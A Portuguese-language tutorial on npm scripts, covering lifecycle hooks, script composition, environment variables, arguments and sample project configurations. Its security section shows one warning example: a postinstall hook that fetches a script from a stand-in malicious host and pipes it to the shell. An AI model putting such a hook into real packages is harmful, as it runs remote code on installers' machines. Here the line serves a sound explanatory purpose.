# npm Scripts: Uma Análise Conceitual Profunda

## 🎯 Introdução e Definição

**npm scripts** são **comandos shell definidos** em `package.json` que automatizam tarefas de desenvolvimento, build, teste e deployment. Conceitualmente, representam **task automation declarativa**, onde você define comandos reutilizáveis que qualquer desenvolvedor pode executar consistentemente através de interface padronizada (`npm run`).

Na essência, npm scripts materializam o princípio de **self-documenting build**, onde package.json serve como documentação viva de como construir, testar e executar projeto, eliminando necessidade de ferramentas externas de build em muitos casos.

## 📋 Fundamentos

### Definição Básica

```json
{
  "scripts": {
    "build": "tsc",
    "start": "node dist/index.js",
    "test": "jest",
    "dev": "ts-node-dev src/index.ts"
  }
}
```

```bash
# Executar scripts
npm run build   # Executa: tsc
npm run start   # Executa: node dist/index.js
npm run test    # Executa: jest
npm run dev     # Executa: ts-node-dev src/index.ts

# Scripts especiais (não precisam de 'run')
npm start       # Atalho para npm run start
npm test        # Atalho para npm run test
```

**Conceito-chave:** Scripts são **comandos shell** executados em contexto especial com `node_modules/.bin` no PATH.

### Scripts Especiais

```json
{
  "scripts": {
    // Não precisam de 'run'
    "start": "node server.js",
    "test": "jest",
    "stop": "kill-port 3000",
    "restart": "npm stop && npm start",

    // Precisam de 'run'
    "build": "tsc",
    "dev": "nodemon",
    "lint": "eslint src"
  }
}
```

```bash
# Especiais (sem 'run')
npm start
npm test
npm stop
npm restart

# Normais (com 'run')
npm run build
npm run dev
npm run lint
```

## 🔍 Análise Conceitual

### 1. Lifecycle Hooks

```json
{
  "scripts": {
    // Pre/Post hooks automáticos
    "prebuild": "npm run clean",
    "build": "tsc",
    "postbuild": "npm run copy-assets",

    "pretest": "npm run lint",
    "test": "jest",
    "posttest": "npm run coverage",

    "prestart": "npm run build",
    "start": "node dist/index.js",

    // Helpers
    "clean": "rm -rf dist",
    "copy-assets": "cp -r assets dist/",
    "lint": "eslint src",
    "coverage": "open coverage/index.html"
  }
}
```

```bash
# npm run build executa:
# 1. prebuild
# 2. build
# 3. postbuild

# npm test executa:
# 1. pretest (lint)
# 2. test (jest)
# 3. posttest (coverage)
```

**Lifecycle hooks disponíveis:**
- `pre<script>` - antes do script
- `post<script>` - depois do script
- `prepare` - antes de pack/publish e após install
- `prepublishOnly` - antes de publish

### 2. Composição de Scripts

```json
{
  "scripts": {
    // Sequencial (&&) - para se um falhar
    "build": "npm run clean && npm run compile && npm run bundle",

    // Paralelo (&) - executa simultaneamente
    "dev": "npm run watch-ts & npm run watch-css",

    // Condicional (||) - executa segundo se primeiro falhar
    "start": "npm run build || echo 'Build failed'",

    // Pipe (|) - passa output de um para outro
    "logs": "docker logs app | grep ERROR",

    // Sub-scripts organizados
    "clean": "rm -rf dist",
    "compile": "tsc",
    "bundle": "webpack",
    "watch-ts": "tsc --watch",
    "watch-css": "sass --watch src:dist"
  }
}
```

```bash
# Executar múltiplos scripts
npm run build  # clean && compile && bundle

# Ferramentas para paralelização
npm install --save-dev npm-run-all

# Paralelo
"dev": "npm-run-all --parallel watch-ts watch-css"

# Sequencial
"build": "npm-run-all clean compile bundle"
```

### 3. Variáveis de Ambiente

```json
{
  "scripts": {
    // Definir variáveis inline
    "start": "NODE_ENV=production node server.js",
    "dev": "NODE_ENV=development nodemon server.js",

    // Multiplataforma (cross-env)
    "start:prod": "cross-env NODE_ENV=production node server.js",

    // Usar variáveis do package.json
    "show-name": "echo $npm_package_name",
    "show-version": "echo $npm_package_version",

    // Variáveis de config
    "start:custom": "node server.js --port=$npm_package_config_port"
  },

  "config": {
    "port": "3000"
  }
}
```

```bash
# Variáveis disponíveis automaticamente:
$npm_package_name          # Nome do pacote
$npm_package_version       # Versão
$npm_package_description   # Descrição
$npm_package_config_<key>  # Configs customizadas

# No Windows, usar %npm_package_name%
# Ou usar cross-env para compatibilidade
```

### 4. Argumentos para Scripts

```json
{
  "scripts": {
    "test": "jest",
    "build": "tsc"
  }
}
```

```bash
# Passar argumentos com --
npm run test -- --watch
# Executa: jest --watch

npm run test -- --coverage --verbose
# Executa: jest --coverage --verbose

npm run build -- --outDir build
# Executa: tsc --outDir build

# Usar variável de ambiente
PORT=8080 npm start
```

### 5. Scripts Complexos

```json
{
  "scripts": {
    // Multi-linha (não suportado diretamente)
    // Solução: usar script file
    "complex": "bash scripts/complex.sh",

    // Ou node script
    "deploy": "node scripts/deploy.js",

    // Ou inline com ; (Windows-safe com cross-env)
    "multi": "npm run build; npm run test; npm run deploy",

    // Condicionais
    "test:ci": "if [ \"$CI\" = \"true\" ]; then npm run test:coverage; else npm test; fi",

    // Loop
    "test:all": "for dir in packages/*; do (cd $dir && npm test); done"
  }
}
```

## 🎯 Aplicabilidade

### Projeto TypeScript Completo

```json
{
  "scripts": {
    // Development
    "dev": "ts-node-dev --respawn --transpile-only src/index.ts",
    "dev:debug": "ts-node-dev --inspect --respawn src/index.ts",

    // Build
    "prebuild": "npm run clean",
    "build": "tsc",
    "build:watch": "tsc --watch",
    "clean": "rm -rf dist",

    // Test
    "test": "jest",
    "test:watch": "jest --watch",
    "test:coverage": "jest --coverage",
    "test:ci": "jest --ci --coverage --maxWorkers=2",

    // Lint & Format
    "lint": "eslint src/**/*.ts",
    "lint:fix": "eslint src/**/*.ts --fix",
    "format": "prettier --write src/**/*.ts",
    "format:check": "prettier --check src/**/*.ts",

    // Type check
    "typecheck": "tsc --noEmit",

    // Production
    "start": "node dist/index.js",
    "start:prod": "NODE_ENV=production node dist/index.js",

    // Combined
    "validate": "npm run lint && npm run typecheck && npm test",
    "prepare": "npm run build"
  }
}
```

### CI/CD Scripts

```json
{
  "scripts": {
    "ci": "npm run validate && npm run build",
    "ci:test": "npm run lint && npm run typecheck && npm run test:ci",

    "deploy:staging": "npm run build && aws s3 sync dist/ s3://staging-bucket",
    "deploy:prod": "npm run build && aws s3 sync dist/ s3://prod-bucket",

    "version:patch": "npm version patch && git push --tags",
    "version:minor": "npm version minor && git push --tags",
    "version:major": "npm version major && git push --tags",

    "publish:npm": "npm run build && npm publish"
  }
}
```

### Monorepo Scripts

```json
{
  "scripts": {
    // Root scripts
    "install:all": "npm install && lerna bootstrap",
    "build:all": "lerna run build",
    "test:all": "lerna run test",

    // Workspace-specific
    "build:app": "npm run build --workspace=packages/app",
    "test:lib": "npm run test --workspace=packages/lib",

    // Parallel execution
    "dev": "npm-run-all --parallel dev:*",
    "dev:app": "npm run dev --workspace=packages/app",
    "dev:api": "npm run dev --workspace=packages/api"
  }
}
```

### Docker Integration

```json
{
  "scripts": {
    "docker:build": "docker build -t myapp .",
    "docker:run": "docker run -p 3000:3000 myapp",
    "docker:dev": "docker-compose up",
    "docker:down": "docker-compose down",

    "docker:logs": "docker logs myapp",
    "docker:shell": "docker exec -it myapp sh",

    "prebuild": "npm run docker:build",
    "start": "npm run docker:run"
  }
}
```

## ⚠️ Considerações

### 1. Portabilidade (Windows vs Unix)

```json
{
  "scripts": {
    // ❌ Não portável (Unix only)
    "clean": "rm -rf dist",
    "copy": "cp -r src dist",

    // ✅ Portável (cross-platform tools)
    "clean": "rimraf dist",
    "copy": "cpy src dist",

    // ✅ Usando cross-env
    "start": "cross-env NODE_ENV=production node server.js"
  }
}
```

```bash
# Instalar ferramentas multiplataforma
npm install --save-dev rimraf cpy-cli cross-env npm-run-all
```

### 2. Performance

```bash
# ❌ Lento (sequencial)
"build": "npm run clean && npm run compile && npm run bundle"

# ✅ Rápido (paralelo quando possível)
"build": "npm-run-all clean --parallel compile bundle"

# ❌ Muitos processos npm
"dev": "npm run watch-ts & npm run watch-css & npm run watch-server"

# ✅ Ferramentas nativas
"dev": "concurrently \"tsc -w\" \"sass -w\" \"nodemon\""
```

### 3. Debugging

```bash
# Ver comando que será executado
npm run build --dry-run

# Verboso (mostrar output detalhado)
npm run build --verbose

# Silencioso (sem output)
npm run build --silent
```

### 4. Security

```json
{
  "scripts": {
    // ❌ Perigoso (pode executar código malicioso)
    "postinstall": "curl http://malicious.com/script.sh | sh",

    // ✅ Safe
    "postinstall": "npm run build"
  }
}
```

## 📚 Conclusão

npm scripts são comandos shell em package.json executados via `npm run`. Scripts especiais (start, test, stop) não precisam de `run`. Pre/post hooks executam automaticamente antes/depois de scripts (prebuild, postbuild). Composição com `&&` (sequencial), `&` (paralelo), `||` (condicional). Variáveis de ambiente automáticas (`$npm_package_*`). Passar argumentos com `--`. Use ferramentas multiplataforma (rimraf, cross-env, npm-run-all) para portabilidade. Scripts servem como documentação viva do projeto. Substituem build tools complexos para muitos casos. Essenciais para automation de desenvolvimento, CI/CD e deployment.
